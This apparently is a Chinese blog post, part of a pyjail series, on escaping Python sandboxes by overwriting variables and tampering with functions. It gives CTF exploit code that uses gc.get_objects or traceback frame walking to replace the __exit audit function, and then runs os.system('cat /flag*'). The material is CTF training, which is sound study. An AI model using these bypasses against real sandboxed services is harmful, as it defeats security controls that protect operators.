---
title: pyjail bypass-06 变量覆盖与函数篡改
date: 2023-05-30 10:23:57
categories:
- Python
tags:
- pyjail
mermaid: true
image:
  path: /assets/images/pyjail.jpg
toc: true
---
> - [pyjail 沙箱逃逸原理](/posts/python-沙箱逃逸原理/)
> - [绕过删除模块或方法](/posts/pyjail-bypass-01-绕过删除模块或方法/)
- [绕过基于字符串匹配的过滤](/posts/pyjail-bypass-02-字符串变换绕过/)
- [绕过命名空间限制](/posts/pyjail-bypass-03-绕过命名空间限制/)
- [绕过多行限制](/posts/pyjail-bypass-05-绕过长度限制/)
- [绕过长度限制](/posts/pyjail-bypass-04-绕过多行限制/)
- [变量覆盖与函数篡改](/posts/pyjail-bypass-06-变量覆盖与函数篡改/)
- [绕过 audit hook](/posts/pyjail-bypass-07-绕过-audit-hook/)
- [绕过 AST 沙箱](/posts/pyjail-bypass-08-绕过-AST-沙箱/)
- [绕过输出限制](/posts/pyjail-bypass-09-绕过输出限制/)
- [绕过 opcode 沙箱](/posts/pyjail-bypass-10-绕过-opcode-沙箱/)
- [利用生成器栈](/posts/pyjail-bypass-11-利用生成器栈/)


## 变量覆盖与函数篡改
在 Python 中，sys 模块提供了许多与 Python 解释器和其环境交互的功能，包括对全局变量和函数的操作。在沙箱中获取 sys 模块就可以达到变量覆盖与函数擦篡改的目的.

sys.modules 存放了现有模块的引用, 通过访问 `sys.modules['__main__']` 就可以访问当当前模块定义的所有函数以及全局变量

```py
>>> aaa = 'bbb'
>>> def my_input():
...     dict_global = dict()
...     while True:
...       try:
...           input_data = input("> ")
...       except EOFError:
...           print()
...           break
...       except KeyboardInterrupt:
...           print('bye~~')
...           continue
...       if input_data == '':
...           continue
...       try:
...           complie_code = compile(input_data, '<string>', 'single')
...       except SyntaxError as err:
...           print(err)
...           continue
...       try:
...           exec(complie_code, dict_global)
...       except Exception as err:
...           print(err)
... 
>>> import sys
>>> sys.modules['__main__']
<module '__main__' (built-in)>
>>> dir(sys.modules['__main__'])
['__annotations__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'aaa', 'my_input', 'sys']
>>> sys.modules['__main__'].aaa
'bbb'
```

除了通过 sys 模块来获取当前模块的变量以及函数外,还可以通过 `__builtins__`篡改内置函数等,这只是一个思路.

总体来说,只要获取了某个函数或者变量就可以篡改, 难点就在于获取.

### 利用 gc 获取已删除模块
这个思路来源于 [writeup by fab1ano – github](https://github.com/fab1ano/hxp-ctf-20/tree/master/audited)

这道题的目标是覆盖 `__main__` 中的 `__exit` 函数,但是题目将 `sys.modules['__main__']` 删除了,无法直接获取.
```py
for module in set(sys.modules.keys()):
    if module in sys.modules:
        del sys.modules[module]
```

`gc` 是Python的内置模块，全名为"garbage collector"，中文译为"垃圾回收"。`gc` 模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互。

Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。`gc` 模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。

下面是一些 `gc` 模块中的主要函数：
1. `gc.collect(generation=2)`：这个函数会立即触发一次垃圾回收。你可以通过 `generation` 参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。
2. `gc.get_objects()`：这个函数会返回当前被管理的所有对象的列表。
3. `gc.get_referrers(*objs)`：这个函数会返回指向 `objs` 中任何一个对象的对象列表。


exp 如下
```py
for obj in gc.get_objects():
    if '__name__' in dir(obj):
        if '__main__' in obj.__name__:
            print('Found module __main__')
            mod_main = obj
        if 'os' == obj.__name__:
            print('Found module os')
            mod_os = obj
mod_main.__exit = lambda x : print("[+] bypass")
```
在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功. 

### 利用 traceback 获取模块
这个思路来源于 [writeup by hstocks – github](https://github.com/hstocks/ctf_writeups/blob/master/2020/hxp/audited/README.md)

主动抛出异常, 并获取其后要执行的代码, 然后将`__exit` 进行替换, 思路也是十分巧妙.

```py
try:
    raise Exception()
except Exception as e:
    _, _, tb = sys.exc_info()
    nxt_frame = tb.tb_frame

    # Walk up stack frames until we find one which
    # has a reference to the audit function
    while nxt_frame:
        if 'audit' in nxt_frame.f_globals:
            break
        nxt_frame = nxt_frame.f_back

    # Neuter the __exit function
    nxt_frame.f_globals['__exit'] = print

    # Now we're free to call whatever we want
    os.system('cat /flag*')
```
但是实际测试时使用 python 3.11 发现 `nxt_frame = tb.tb_frame` 会触发 `object.__getattr__` hook. 不同的版本中触发 hook 的地方会有差异,这个 payload 可能仅在 python 3.9 (题目版本)中适用

## 参考资料
- [Python沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
- [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
- [Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
- [python沙箱逃逸学习记录](https://xz.aliyun.com/t/12303#toc-11)
- [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [[PyJail] python沙箱逃逸探究·上（HNCTF题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)
- [[PyJail] python沙箱逃逸探究·中（HNCTF题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)
- [[PyJail] python沙箱逃逸探究·下（HNCTF题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)
- [audited2](https://ctftime.org/writeup/31883)
- [【ctf】HNCTF Jail All In One](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
- [HAXLAB — Endgame Pwn](https://ctftime.org/writeup/28286)
- [Python沙箱逃逸的n种姿势](https://ctftime.org/writeup/28286)
- [hxp2020-audited](https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html)